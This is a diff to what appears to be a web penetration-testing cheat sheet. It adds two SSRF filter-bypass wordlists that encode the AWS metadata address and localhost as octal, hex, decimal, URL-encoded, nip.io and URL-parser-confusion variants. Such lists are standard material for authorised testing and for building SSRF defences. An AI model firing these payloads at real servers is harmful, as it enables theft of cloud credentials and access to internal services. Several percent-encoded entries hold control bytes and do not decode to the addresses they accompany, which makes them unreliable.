@@ -393,7 +393,7 @@ https://github.com/internetwache/GitTools
 1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
 2. Identify access controls in the application  
 3. Change the request method (GET, POST, PUT, DELETE, PATCH…)  
-4. search old versions of API's /api/v1/ /api/v2/ /api/v3/  
+4. Search old versions of API's /api/v1/ /api/v2/ /api/v3/  
 5. Try sending a (*) instead of the ID, especially at search points  
 6. Brute-force IDs depending on context and predictability 
 	
@@ -1313,10 +1313,117 @@ e.g.
 e.g.  
 `http://[::]`
 
-#### Wordlist meta-data Bypass
+#### AWS metadata bypass wordlist
+```
+169.254.169.254.nip.io
+http://169.254.169.254.nip.io
+%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2e%6e%69%70%2e%69%6f
+http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2e%6e%69%70%2e%69%6f
+169.254.169.254
+http://169.254.169.254
+%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
+http://%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
+0251.0376.0251.0376	
+http://0251.0376.0251.0376
+%30%32%35%31%2e%30%33%37%36%2e%30%32%35%31%2e%30%33%37%36
+http://%30%32%35%31%2e%30%33%37%36%2e%30%32%35%31%2e%30%33%37%36
+0xA9FEA9FE
+http://0xA9FEA9FE
+%30%78%41%39%46%45%41%39%46%45
+http://%30%78%41%39%46%45%41%39%46%45
+2852039166
+http://2852039166
+%32%38%35%32%30%33%39%31%36%36
+http://%32%38%35%32%30%33%39%31%36%36
+⑯⑨。②⑤④。⑯⑨｡②⑤④
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④
+%6f%68%02%61%64%63%02%6f%68%61%61%64%63%2f
+http://%6f%68%02%61%64%63%02%6f%68%61%61%64%63%2f
+```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_meta_bypass.txt  
 
-### Wordlist localhost Bypass
+#### Wordlist for localhost bypass
+```
+0o177.0.0.1
+%30%6f%31%37%37%2e%30%2e%30%2e%31
+http://%30%6f%31%37%37%2e%30%2e%30%2e%31
+http://①②⑦。①
+①②⑦。①
+%60%61%66%02%60
+%68%74%74%70%3a%2f%2f%60%61%66%02%60
+http://0o177.0.0.1
+q177.0.0.1
+%71%31%37%37%2e%30%2e%30%2e%31
+http://%71%31%37%37%2e%30%2e%30%2e%31
+http://q177.0.0.1
+o177.0.0.1
+%6f%31%37%37%2e%30%2e%30%2e%31
+http://%6f%31%37%37%2e%30%2e%30%2e%31
+http://o177.0.0.1
+0177.0.0.1
+%30%31%37%37%2e%30%2e%30%2e%31
+http://%30%31%37%37%2e%30%2e%30%2e%31
+http://0177.0.0.1
+2130706433
+%32%31%33%30%37%30%36%34%33%33
+http://%32%31%33%30%37%30%36%34%33%33
+http://2130706433
+127.0.0.0
+%31%32%37%2e%30%2e%30%2e%30
+http://%31%32%37%2e%30%2e%30%2e%30
+http://127.0.0.0
+127.0.1.3
+%31%32%37%2e%30%2e%31%2e%33
+http://%31%32%37%2e%30%2e%31%2e%33
+http://127.0.1.3
+127.127.127.127
+%31%32%37%2e%31%32%37%2e%31%32%37%2e%31%32%37
+http://%31%32%37%2e%31%32%37%2e%31%32%37%2e%31%32%37
+http://127.127.127.127
+[::]
+http://[::]
+0
+%30
+http://%30
+http://0
+127.1
+%31%32%37%2e%31
+http://%31%32%37%2e%31
+%31%32%37%2e%30%2e%31
+http://127.1
+127.0.1
+%31%32%37%2e%30%2e%31
+http://%31%32%37%2e%30%2e%31
+http://127.0.1
+127.1.1.1
+%31%32%37%2e%31%2e%31%2e%31
+http://%31%32%37%2e%31%2e%31%2e%31
+http://127.1.1.1
+0x7f000001
+%30%78%37%66%30%30%30%30%30%31
+http://%30%78%37%66%30%30%30%30%30%31
+http://0x7f000001
+017700000001
+%30%31%37%37%30%30%30%30%30%30%30%31
+http://%30%31%37%37%30%30%30%30%30%30%30%31
+http://017700000001
+0177.00.00.01
+%30%31%37%37%2e%30%30%2e%30%30%2e%30%31
+http://%30%31%37%37%2e%30%30%2e%30%30%2e%30%31
+http://0177.00.00.01
+127.0.0.1.nip.io
+%31%32%37%2e%30%2e%30%2e%31%2e%6e%69%70%2e%69%6f
+http://%31%32%37%2e%30%2e%30%2e%31%2e%6e%69%70%2e%69%6f
+http://127.0.0.1.nip.io
+localtest.me
+http://%6c%6f%63%61%6c%74%65%73%74%2e%6d%65
+%6c%6f%63%61%6c%74%65%73%74%2e%6d%65
+http://localtest.me
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_local_bypass.txt
 
 ### Protocol Smuggling
